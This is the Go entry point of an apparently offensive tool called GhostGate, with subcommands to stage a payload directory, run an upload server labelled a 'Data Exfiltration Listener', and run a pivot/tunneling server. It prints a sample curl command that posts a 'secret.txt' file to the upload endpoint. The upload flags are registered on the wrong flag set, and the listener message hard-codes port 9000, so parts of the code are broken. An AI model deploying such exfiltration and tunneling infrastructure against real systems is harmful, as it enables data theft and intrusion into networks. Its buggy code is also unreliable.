package main

import (
	"GhostGate/config"
	"GhostGate/internal/essentail"
	"GhostGate/internal/sanitation"
	"GhostGate/internal/validation"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
)

func main(){
	// Checks if the init command is called
	if len(os.Args) > 1 && os.Args[1] == "init" {
		// Initalises the configuration file
		if err := config.InitializeConfig(); err != nil {
			// Logs an error
            log.Fatalf("Failed to initialize: %v", err)
        }
		// Returns nothing
		return
	}

	// Loads in the configuration
	cfg, err := config.LoadConfig()

	// CHecks for an error
	if err != nil {
        log.Printf("[!] Warning: Could not load config file, using defaults: %v", err)
        // Even if err occurs, cfg might have Viper defaults if handled in LoadConfig
    }

	/*
		Flags for each function which the listner can carry out
	*/

	// Stores the flag set for setting up a payload staging directory
	stageDirectoryOption := flag.NewFlagSet("stageDir", flag.ExitOnError)

	// Stores the flags for this flagset
	stageDirectoryPort := stageDirectoryOption.String("p", cfg.DefaultPort, "Specifies the port number to host the server")
	stageDirectoryDir := stageDirectoryOption.String("f",  cfg.DefaultPayloadsDirectory, "Specifies the file path of the staging directory")
	stageDirectorySource := stageDirectoryOption.String("s", "", "Specifies the file path of the source directory")

	// Stores the flag set for uploading files
	uploadFilesOption := flag.NewFlagSet("uploadFile", flag.ExitOnError)

	// Stores the flags for this flagset
	uploadFilesPort := stageDirectoryOption.String("p", cfg.DefaultPort, "Specifies the port number to host the server")
	uploadFilesUrlPath := stageDirectoryOption.String("u", cfg.DefaultURLPath, "Specifies the URL path to host the endpoint")

	// Stores the flagset for the tunnel commands
	tunnelOption := flag.NewFlagSet("tunnel", flag.ExitOnError)

	// Stores the flags for the tunnel options choice
	tunnelTarget := tunnelOption.String("u", "", "Specifies the target of the tunnel")
	tunnelPort := tunnelOption.String("p", cfg.DefaultPort, "Specifies the port number to host the server")


	// Checks if the user has provided a subcommand
	if len(os.Args) < 2 {
		// Outputs an invaild command
		fmt.Println("Unexpected input")
		// Exits the program
		os.Exit(1)
	}

	// Switch to select the command to be used
	switch os.Args[1] {
	case "stageDir":
		// Parse the flags starting from the 3rd argument (index 2)
		stageDirectoryOption.Parse(os.Args[2:])

		// Cleans the file path
		cleanPort := sanitation.CleanPort(*stageDirectoryPort)

		// Stores the result of the port validation
		portNumberValid := validation.ValidatePort(cleanPort)

		// Checks if the number is not valid
		if !portNumberValid {
			// Logs the error
			log.Fatalf("Invalid port: %s", *stageDirectoryPort)
		}

		// Sanitises the file path
		cleanPath := sanitation.CleanFilePath(*stageDirectoryDir)

		// Stores the result and cleaned version of the validate port
		cleanDir, dirValid := validation.ValidateFilePath(cleanPath)

		// Checks if the directory is not valid
		if !dirValid {
			// Logs the error
			log.Fatalf("Invalid directory: %s", *stageDirectoryDir)
		}

		cleanSource, sourceValid := validation.ValidateFilePath(*stageDirectorySource)

		// Checks if the directory is not valid
		if !sourceValid {
			// Logs the error
			log.Fatalf("Invalid directory: %s", *stageDirectorySource)
		}

		// Passes the flags into the function
		essentail.StagePayloadDirectory(*stageDirectoryPort, cleanDir, cleanSource)
	case "uploadFile":
		// Parse the flags
		uploadFilesOption.Parse(os.Args[2:])

		// Cleans the port number
		cleanPort := sanitation.CleanPort(*uploadFilesPort)

		// Stores the result of the port validation
		portNumberValid := validation.ValidatePort(cleanPort)

		// Checks if the number is not valid
		if !portNumberValid {
			// Logs the error
			log.Fatalf("Invalid port: %s", *uploadFilesPort)
		}

		// Checks if the url is valid 
		_, err := validation.ValidateURL(*uploadFilesUrlPath)

		// Checks if there is errors
		if err != nil{
			fmt.Println(err)
		} 

		// Handles the function
		http.HandleFunc(*uploadFilesUrlPath, essentail.UploadHandler)

		// Prints information about the path
		fmt.Println("[*] Data Exfiltration Listener active on port 9000")
		fmt.Println("[*] Test Command: curl -X POST --data-binary @secret.txt -H 'X-File-Name: secret.txt' http://localhost:9000/upload")
		
		// Listens and serves the server
		if err := http.ListenAndServe(":" + *uploadFilesPort, nil); err != nil {
			log.Fatal(err)
		}
	case "tunnel":
		// Parses the flags
		tunnelOption.Parse(os.Args[2:])

		// Checks if the url is valid 
		_, err := validation.ValidateURL(*tunnelTarget)

		// Checks if there is errors
		if err != nil{
			fmt.Println(err)
		} 

		// Cleans the port number
		cleanPort := sanitation.CleanPort(*tunnelPort)

		// Stores the result of the port validation
		portNumberValid := validation.ValidatePort(cleanPort)

		// Checks if the number is not valid
		if !portNumberValid {
			// Logs the error
			log.Fatalf("Invalid port: %s", *tunnelPort)
		}

		// Handles the function for tunnel
		http.HandleFunc("/", essentail.HandleTunnel(*tunnelTarget))
		// Outputs information about whats going on
		log.Println("[*] Pivot/Tunneling Server active on port", *tunnelPort)
		log.Fatal(http.ListenAndServe(":"+*tunnelPort, nil))
	}
}